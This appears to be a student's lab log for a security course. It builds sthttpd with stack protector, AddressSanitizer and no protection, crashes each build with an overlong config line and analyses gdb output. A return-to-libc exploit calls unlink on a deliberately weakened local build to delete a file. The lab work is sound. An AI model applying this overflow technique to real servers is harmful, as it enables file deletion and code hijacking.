
-I first copied the file to my linux server machine using the following commands.

~ Christie$ scp ~/Downloads/sthttpd-2.27.0 mathews@lnxsrv.seas.ucla.edu: ~
~ Christie$ ssh mathews@lnxsrv.seas.ucla.edu
[mathews@lnxsrv01 ~]$ tar -zxvf sthttpd-2.27.0.tar.gz 

#I first tried to create a patch file called patch.txt and ran the command 
 “patch -p1 <patch.txt”
#This resulted in an error. It said Hunk #2 FAILED at 1012.

-So, I opened shttpd.c inside /src and manually changed the lines of code according to the 
 specifications of the spec.

-Then I built it using the given command 
		./configure \
		   CFLAGS='-m32' \
		   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"

-I ran which gcc to check if I was in the right directory and it returned /usr/bin/gcc so 
 I knew I did something wrong.
-I had to go back and fix it by running emacs ~/.profile and adding the code
 “PATH=/usr/local/cs/bin:$PATH”.
-Then I ran the code “export PATH=/usr/local/cs/bin:$PATH” in the terminal
 and tried “which gcc” again. It returned /usr/local/cs/bin/gcc!

-Then I compiled it 3 times using the following commands:

(SP) for strong stack protection:
	-m32 -g3 -O2 -fno-inline -fstack-protector-strong
(AS) for address sanitization:
	-m32 -g3 -O2 -fno-inline -fsanitize=address
(NO) for neither:
	-m32 -g3 -O2 -fno-inline

make clean
make CFLAGS='-m32 -g3 -O2 -fno-inline -fstack-protector-strong' 
mv src/thttpd src/thttpd-sp

make clean
make CFLAGS='-m32 -g3 -O2 -fno-inline -fsanitize=address' 
mv src/thttpd src/thttpd-as

make clean
make CFLAGS='-m32 -g3 -O2 -fno-inline' 
mv src/thttpd src/thttpd-no


-Then I ran “ps aux | grep httpd” to see if the port I was going to run my server on was busy.
-I used the formula with my ID: 104404412 —> (12330 + 3 * (104404412 % 293) + 1) ==> PORT: 12376

-I ran the server: “src/thttpd-sp -p 12376”
-Checked the server: “curl http://localhost:12376/src/test.txt” It 
 returned the text in the file. SUCCESS

-To crash the servers I smashed the stack by including a line in the config file I
 created: crash.txt, that is longer than 100 characters. thttpd.c has a char array 100 char
 along to store each line. Anything longer than that would corrupt the values in the next spot 
 on the stack.
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
crash.txt											+
port=12345678901234511234567890123456789012345678901234567890123456789012345678901234567890123  +
456789012345678901234567890									+	
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


=================================================================
*I ran the variants under gdb using “gdb --args src/thttpd-(the right variant) -p 12376 -C crash.txt” and set 
a breakpoint at 1013, a random line before the line I thought would cause the problem.
We changed thttpd.c so that the char array to holds each line is only 100 char long. Then
we modified the fgets() function call so that it would only stop reading at 1000 char. Thus, 
fgets() would keep reading and storing char’s into the stack past the 100 bytes of reserved
space, consequently corrupting later values. The error was created in line 1015, and when it
tried to move on and call a different function, the return address was corrupted, resulting in
“fgets@plt ()” and later “??()” within gdb.


=================================================================

			Variant SP Crash

[mathews@lnxsrv04 ~/sthttpd-2.27.0]$ src/thttpd-sp -p 12376 -C crash.txt
*** stack smashing detected ***: src/thttpd-sp terminated
Segmentation fault

gdb --args src/thttpd-sp -p 12376 -C crash.txt
“break read_config”
“set disassemble-next-line on”
“run”
“stepi”. . .

0x080499ee in fopen@plt ()
=> 0x080499ee <fopen@plt+6>:	68 c0 01 00 00	push   $0x1c0
0x080499f3 in fopen@plt ()
=> 0x080499f3 <fopen@plt+11>:	e9 60 fc ff ff	jmp    0x8049658

*I believe the jmp instruction caused the error because the value it’s jumping to was modified by
the random values I inputed earlier. However, since sp uses canaries it noticed that I had somehow modified
past the value I should have so it returned the ***stack smashing detected *** warning. Stack canaries
leave a value before the return address that must be modified before the return address is modified.
Then, it checks if this value is the same before continuing; if it’s different, the computer knows
that there was a buffer overflow and to stop the program.

Backtrace:
#0  uw_frame_state_for (context=context@entry=0xffffb9b8, fs=fs@entry=0xffffba38) at ../../../../gcc-4.9.2/libgcc/unwind-dw2.c:1253
#1  0x00158b20 in _Unwind_Backtrace (trace=0xa77670 <backtrace_helper>, trace_argument=0xffffbb14) at ../../../../gcc-4.9.2/libgcc/unwind.inc:290
#2  0x00a77865 in        backtrace () from /lib/libc.so.6
#3  0x009e874b in   __libc_message () from /lib/libc.so.6
#4  0x00a7adad in   __fortify_fail () from /lib/libc.so.6
#5  0x00a7ad5a in __stack_chk_fail () from /lib/libc.so.6
#6  0x0804b69f in read_config (filename=<optimized out>) at thttpd.c:1190
#7  0x36353433 in ?? ()
. .  .  
#29

=================================================================
			Variant AS Crash

[mathews@lnxsrv02 ~/sthttpd-2.27.0]$ src/thttpd-as -p 12376 -C crash.txt
ASAN:SIGSEGV
==13948==ERROR: AddressSanitizer: SEGV on unknown address 0x30393837 (pc 0x30393837 sp 0xffb33b80 bp 0x36353433 T0)
    #0 0x30393836 (+0x8393836)

I used the same instructions as above to get the bt and machine instruction.

0x0804a12a in fopen@plt ()
=> 0x0804a12a <fopen@plt+6>:	68 50 02 00 00	push   $0x250
0x0804a12f in fopen@plt ()
=> 0x0804a12f <fopen@plt+11>:	e9 40 fb ff ff	jmp    0x8049c74
*I believe the jmp instruction caused the error because the value it’s jumping to was modified by
the random values I inputed earlier. Address Sanitizer causes the program to abort because it runs into
an unknown address. Address Sanitizer is a program that recognizes any out of bounds memory accesses to the stack
and returns an error and stops the program the instant it runs into this problem to prevent errors and hackers. It
employs shadow space to check if each byte of the program is safe to access.

Backtrace:
#0  uw_frame_state_for (context=context@entry=0xffffb8d0, fs=fs@entry=0xffffb950)
    at ../../../../gcc-4.9.2/libgcc/unwind-dw2.c:1253
#1  0x00777b20 in _Unwind_Backtrace (
    trace=0x16e5e0 <__sanitizer::Unwind_Trace(_Unwind_Context*, void*)>, trace_argument=0xffffba38)
    at ../../../../gcc-4.9.2/libgcc/unwind.inc:290
#2  0x0016ebaf in __sanitizer::StackTrace::SlowUnwindStack (this=0xffffbb38, pc=1302225, 
    max_depth=1094795585)
    at ../../../../../gcc-4.9.2/libsanitizer/sanitizer_common/sanitizer_linux_libcdep.cc:168
#3  0x00171a60 in __sanitizer::StackTrace::Unwind (this=0xffffbb38, max_depth=256, pc=1302225, 
    bp=4294950840, stack_top=4294959104, stack_bottom=4284473344, request_fast_unwind=false)
    at ../../../../../gcc-4.9.2/libsanitizer/sanitizer_common/sanitizer_stacktrace_libcdep.cc:19
#4  0x00165635 in __asan_report_error (pc=1302225, bp=4294950840, sp=4294950812, addr=4294951012, 
    is_write=false, access_size=114) at ../../../../../gcc-4.9.2/libsanitizer/asan/asan_report.cc:776
#5  0x0013dee6 in __interceptor_strchr (str=0xffffc000 'A' <repeats 112 times>, "\n", c=35)
    at ../../../../../gcc-4.9.2/libsanitizer/asan/asan_interceptors.cc:417
#6  0x0804da70 in read_config (filename=<optimized out>) at thttpd.c:1018
#7  0x41414141 in ?? ()
#8  0x41414141 in ?? ()
#9  0x41414141 in ?? ()
#10 0x41414141 in ?? ()
#11 0x41414141 in ?? ()
#12 0x41414141 in ?? ()
#13 0x41414141 in ?? ()


gdb --args src/thttpd-as -p 12376 -C crash.txt
=================================================================
			Variant NO Crash	
								
[mathews@lnxsrv04 ~/sthttpd-2.27.0]$ src/thttpd-no -p 12376 -C crash.txt
Segmentation fault

gdb --args src/thttpd-no -p 12376 -C crash.txt

=> 0x0804b4ba <read_config+1274>:	c3	ret 
*This ret causes the program to crash because it’s returning with a corrupted return value. Since there are no stack canaries
or an address sanitizer program, the program returns to a return value we modified. This return value is random however, so
it results in the error because there is nowhere to go.

				Backtrace
I couldn’t get a backtrace for NO variant after it crashed but this is the bt before:
#0  0x080499a7 in fopen@plt ()
#1  0x000001c0 in ?? ()
#2  0x0804afd7 in read_config (filename=0xffffd611 "crash.txt") at thttpd.c:1008
#3  0x0804b88a in parse_args (argc=argc@entry=5, argv=argv@entry=0xffffd464) at thttpd.c:893
#4  0x0804d01a in main (argc=5, argv=0xffffd464) at thttpd.c:380

=================================================================================================


EXPLOIT:
I created a c program to call unlink and found the following as the address to call unlink:
0x00292d20

   0x00292d20 <+0>:	mov    %ebx,%edx
   0x00292d22 <+2>:	mov    0x4(%esp),%ebx
   0x00292d26 <+6>:	mov    $0xa,%eax
   0x00292d2b <+11>:	call   *%gs:0x10
   0x00292d32 <+18>:	mov    %edx,%ebx
   0x00292d34 <+20>:	cmp    $0xfffff001,%eax
   0x00292d39 <+25>:	jae    0x292d3c <unlink+28>
   0x00292d3b <+27>:	ret    
   0x00292d3c <+28>:	call   0x2e4048 <__i686.get_pc_thunk.cx>
   0x00292d41 <+33>:	add    $0xbf2b3,%ecx
   0x00292d47 <+39>:	mov    -0x28(%ecx),%ecx
   0x00292d4d <+45>:	xor    %edx,%edx
   0x00292d4f <+47>:	sub    %eax,%edx
   0x00292d51 <+49>:	mov    %edx,%gs:(%ecx)
   0x00292d54 <+52>:	or     $0xffffffff,%eax
   0x00292d57 <+55>:	jmp    0x292d3b <unlink+27>

I updated my code with the return address 0x00292d20 by converting it to little endian and then hexadecimal.
I ran it through GDB and it gave me:
0x00292d20: ==> 20 2d 29 00
Program received signal SIGSEGV, Segmentation fault.
0x31313131 in ?? ()

This is because I replaced the 4 bytes after the return address with BBBB. I ran it through gdb and saw that
it went to unlink() and then look for an argument to work with. I found a memory address in the stack before the
return address and converted it to hexadecimal using this command: “echo -n “e4 c1 ff ff”|./hex2raw >> crash2.txt” 
0xffffc1dc: ==> dc c1 ff ff

It worked, resulting in:
Program received signal SIGSEGV, Segmentation fault.
0xffffc1dc in ?? ()

I checked the target.txt file and it was gone!
I assumed stack randomization was disabled.
I ran this on lnxsrv02.
Works 100% of the time!
                   COMMAND
gdb --args thttpd-no -p 12376 -C exploit.txt 
===================================================================================================================
[mathews@lnxsrv02 ~/sthttpd-2.27.0/src]$ touch target.txt
[mathews@lnxsrv02 ~/sthttpd-2.27.0/src]$ ls
exploit.txt   fdwatch.o   libmatch.a   match.c           mime_types.h  ##target.txt##     test.txt    thttpd.c       thttpd.h   thttpd-sp  version.h
exploit.txt~  libhttpd.c  Makefile     match.h           mmc.c         tdate_parse.c  test.txt~   thttpd.c~      thttpd-no  timers.c
fdwatch.c     libhttpd.h  Makefile.am  match.o           mmc.h         tdate_parse.h  thttpd-as   thttpd.c.orig  thttpd.o   timers.h
fdwatch.h     libhttpd.o  Makefile.in  mime_encodings.h  mmc.o         tdate_parse.o  #thttpd.c#  thttpd.c.rej   thttpd.s   timers.o
[mathews@lnxsrv02 ~/sthttpd-2.27.0/src]$ gdb --args thttpd-no -p 12376 -C exploit.txt 
GNU gdb (GDB) 7.9
Copyright (C) 2015 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-unknown-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from thttpd-no...done.
(gdb) run
Starting program: /w/home.02/ee/ugrad/mathews/sthttpd-2.27.0/src/thttpd-no -p 12376 -C exploit.txt
/bin/bash: error importing function definition for `BASH_FUNC_g++nosan'
/bin/bash: error importing function definition for `BASH_FUNC_g++'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) q
A debugging session is active.

	Inferior 1 [process 13363] will be killed.

Quit anyway? (y or n) y

[mathews@lnxsrv02 ~/sthttpd-2.27.0/src]$ ls
exploit.txt   fdwatch.o   libmatch.a   match.c           mime_types.h  tdate_parse.c  test.txt~   thttpd.c~      thttpd-no  timers.c
exploit.txt~  libhttpd.c  Makefile     match.h           mmc.c         tdate_parse.h  thttpd-as   thttpd.c.orig  thttpd.o   timers.h
fdwatch.c     libhttpd.h  Makefile.am  match.o           mmc.h         tdate_parse.o  #thttpd.c#  thttpd.c.rej   thttpd.s   timers.o
fdwatch.h     libhttpd.o  Makefile.in  mime_encodings.h  mmc.o         test.txt       thttpd.c    thttpd.h       thttpd-sp  version.h

####TARGET.TXT is gone! 

===================================================================================================================
8) COMPARING SOURCE FILES

-To get the compiled assembly language files, I had to look outside the directory-1 back.
-Assembly Code: What I ran to get the assembly language .s files.

gcc -m32 -O2 —S -fno-inline -fstack-protector-strong thttpd-sp
(AS) for address sanitization:
gcc -m32 -O2 —S -fno-inline -fsanitize=address
(NO) for neither:
gcc -m32 -O2 —S -fno-inline


*SP Variant*
The SP variant is identical to the NO variant. It should employ stack canaries to check for buffer overflows and such, but
when I analyze the file I couldn’t find any code for canaries. It looks the same as the NO variant, so I don’t think in
this case f-stack protector strong does much.

*AS Variant*
The AS variant code is the longest.
It employs address sanitizer’s algorithm for converting the program to shadow space offsets. It then checks each byte before 
running it using a function something like the following. It uses (Addr>>Scale)+Offset to figure out the shadow addresses.
	ShadowAddr = (Addr >> 3) + Offset;
	if (*ShadowAddr != 0)
	   ReportAndCrash(Addr);
Something you notice in the code is all the compares. This is address sanitizer checking the shadow addresses. Address Sanitizer
slows down the program but something like %70; this explains why the code is long compared to NO and SP.
You see the following segment repetitively throughout the code:
	shrl	$3, %edx
	movzbl	536870912(%edx), %edx
This is exactly the algorithm described above to figure out the shadow address. In this case, the offset is 536870912, and the 
scale is 3. If I ran the program again, this would change. So, when we try to cause a buffer overflow, this is detected as a 
change by address sanitizer because we never changed the shadow space accordingly.

*NO Variant*
The NO variant has no protection and is thus considered the basic version that SP and AS should build on. I was able to exploit NO by
running it under gdb with Stack Randomization disabled. It doesn’t have stack canaries to warn it of buffer overflows or a program like
address-sanitizer.


EXTRA STUFF: Ignore…
0x080499a2 in fopen@plt ()
=> 0x080499a2 <fopen@plt+6>:	68 c0 01 00 00	push   $0x1c0
0x080499a7 in fopen@plt ()
=> 0x080499a7 <fopen@plt+11>:	e9 60 fc ff ff	jmp    0x804960c
*I believe the jmp instruction caused the error because the value it’s jumping to was modified by
the random values I inputed earlier


